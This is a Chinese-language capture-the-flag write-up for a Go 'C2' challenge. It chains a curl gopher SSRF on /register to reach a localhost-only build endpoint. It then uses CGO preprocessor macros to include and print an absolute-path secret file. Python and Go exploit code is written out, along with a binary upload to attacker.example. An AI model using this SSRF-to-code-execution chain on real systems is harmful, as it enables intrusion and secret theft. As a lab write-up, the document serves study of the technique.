# C2

## 题目简述

题目给出一个 Go C2 服务。公开的 `/register` 会直接执行 `curl <agentUrl>`，形成支持 gopher 的 SSRF；`/flag` 与 `/agent/{id}/execute` 只允许 localhost 访问。后者会把请求体保存为临时 `main.go`、执行 `go build`，再用 `curl -T` 把生成的二进制上传到已注册 agent。目标是从 SSRF 进入本地执行端点，并让动态编译的 Go/CGO 源码读取编译容器中的 `/app/secrets/flag.go`。

## 解题过程

先注册一个由自己控制的 HTTP agent，取得 UUID。该 agent 需要接受稍后 `curl -T` 发来的二进制：

```python
import requests

base = "https://target.example"
agent_url = "https://attacker.example"
agent_id = requests.post(
    base + "/register",
    json={"agentUrl": agent_url},
).text.strip()
```

直接在临时源码中导入 `ctf.nusgreyhats.org/c2/secrets` 会失败，因为构建目录位于模块目录之外；`go:embed` 也禁止绝对路径。CGO 的 C 预处理器却可以绝对包含文件。通过宏把 Go 源文件中的 `package`、`secrets` 和 `var` 改写成合法 C 声明：

```go
package main

/*
#define package
#define secrets
#define var char*
#include "/app/secrets/flag.go"
#include <stdio.h>
void printflag(void) {
    puts(Flag);
}
*/
import "C"

func main() {
    C.printflag()
}
```

随后构造一条访问 localhost 管理端点的原始 HTTP 请求，并编码进 gopher URL：

```python
from urllib.parse import quote

payload = open("payload.go", encoding="utf-8").read()
raw = (
    f"POST /agent/{agent_id}/execute HTTP/1.1\r\n"
    f"Host: localhost:8080\r\n"
    f"Content-Length: {len(payload.encode())}\r\n"
    "Connection: close\r\n\r\n"
).encode() + payload.encode()

gopher = "gopher://127.0.0.1:8080/_" + quote(raw)
requests.post(base + "/register", json={"agentUrl": gopher})
```

`curl` 从本机发出请求，绕过 `RemoteAddr` 检查。服务编译 payload 后，将二进制 PUT 到 `https://attacker.example/exec`。保存并执行该二进制，CGO 函数打印：

```text
grey{5n34ky_60ph3r}
```

## 方法总结

- 核心技巧：将 curl gopher SSRF 转成 localhost 原始 HTTP 请求，再借服务端动态 CGO 编译读取任意绝对路径源码。
- 识别信号：用户可控 URL 直接传给 curl、管理权限只依赖源地址、并提供动态构建接口时，应联合审计协议支持与构建上下文。
- 复用要点：Go 模块导入和 `go:embed` 的限制不等于 C 预处理器限制；CGO preamble 会经过宏展开，可将其它语言风格的短源码重解释为 C 声明。
